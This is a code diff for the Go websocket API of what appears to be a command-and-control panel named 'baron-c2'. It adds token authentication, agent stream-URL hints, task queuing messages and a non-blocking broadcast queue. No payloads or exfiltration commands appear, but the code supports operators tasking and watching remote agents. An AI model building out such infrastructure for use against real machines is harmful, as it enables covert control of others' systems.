@@ -3,9 +3,11 @@ package api
 import (
 	"encoding/json"
 	"net/http"
+	"net/url"
 	"sync"
 	"time"
 
+	"baron-c2/internal/auth"
 	"baron-c2/internal/repo"
 	"github.com/gin-gonic/gin"
 	"github.com/gorilla/websocket"
@@ -75,7 +77,7 @@ type Hub struct {
 
 var GlobalHub = &Hub{
 	clients:    make(map[*websocket.Conn]bool),
-	broadcast:  make(chan interface{}),
+	broadcast:  make(chan interface{}, 256),
 	register:   make(chan *websocket.Conn),
 	unregister: make(chan *websocket.Conn),
 }
@@ -111,6 +113,15 @@ func (h *Hub) Run() {
 
 // PanelStreamWS handles binary stream subscriptions for the panel
 func PanelStreamWS(c *gin.Context) {
+	tok := c.Query("token")
+	if tok == "" {
+		tok = c.GetHeader("X-Token")
+	}
+	if _, _, err := auth.ParsePanelToken(tok); err != nil {
+		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+
 	agentID := c.Query("cid")
 	if agentID == "" {
 		c.String(http.StatusBadRequest, "Missing cid")
@@ -181,8 +192,17 @@ type wsCommand struct {
 }
 
 // WSHandler handles websocket requests from the panel.
-// It now processes incoming messages (commands) instead of dropping them.
 func WSHandler(c *gin.Context) {
+	token := c.Query("token")
+	if token == "" {
+		token = c.GetHeader("Sec-WebSocket-Protocol")
+	}
+	user, _, err := auth.ParsePanelToken(token)
+	if err != nil || user == "" {
+		c.JSON(http.StatusUnauthorized, gin.H{"ok": false, "error": "invalid token"})
+		return
+	}
+
 	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
 	if err != nil {
 		log.Warn().Err(err).Msg("websocket upgrade failed")
@@ -195,10 +215,9 @@ func WSHandler(c *gin.Context) {
 		GlobalHub.unregister <- conn
 	}()
 
-	// Send auth_ok immediately so the panel UI activates
-	conn.WriteJSON(gin.H{
+	_ = conn.WriteJSON(gin.H{
 		"event": "auth_ok",
-		"data":  gin.H{"user": "operator"},
+		"data":  gin.H{"user": user},
 	})
 
 	for {
@@ -214,11 +233,29 @@ func WSHandler(c *gin.Context) {
 
 		switch msg.Event {
 		case "auth":
-			// Already handled above; ignore
+			// Token validated at upgrade; optional refresh ignored
 		case "command":
 			handleWSCommand(msg.Data)
 		case "subscribe_stream":
-			// TODO: stream subscription logic
+			var d struct {
+				CID string `json:"cid"`
+			}
+			_ = json.Unmarshal(msg.Data, &d)
+			if d.CID != "" {
+				proto := "ws"
+				if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
+					proto = "wss"
+				}
+				host := c.Request.Host
+				if fh := c.GetHeader("X-Forwarded-Host"); fh != "" {
+					host = fh
+				}
+				u := proto + "://" + host + "/api/panel/stream_ws?cid=" + url.QueryEscape(d.CID) + "&token=" + url.QueryEscape(token)
+				_ = conn.WriteJSON(gin.H{
+					"event": "stream_hint",
+					"data":  gin.H{"url": u, "cid": d.CID},
+				})
+			}
 		}
 	}
 }
@@ -267,12 +304,20 @@ func handleWSCommand(raw json.RawMessage) {
 		},
 	})
 
-	GlobalHub.BroadcastSystem("TASK: <" + cmd.Action + "> queued for " + cmd.CID + " (id: " + task.ID[:8] + ")")
+	tid := task.ID
+	if len(tid) > 8 {
+		tid = tid[:8]
+	}
+	GlobalHub.BroadcastSystem("TASK: <" + cmd.Action + "> queued for " + cmd.CID + " (id: " + tid + ")")
 }
 
-// Broadcast sends a message to all connected panel users
+// Broadcast sends a message to all connected panel users (non-blocking; drops if queue full).
 func Broadcast(msg interface{}) {
-	GlobalHub.broadcast <- msg
+	select {
+	case GlobalHub.broadcast <- msg:
+	default:
+		log.Warn().Msg("hub broadcast queue full, dropping message")
+	}
 }
 
 // BroadcastSystem sends a system message to the panel terminal
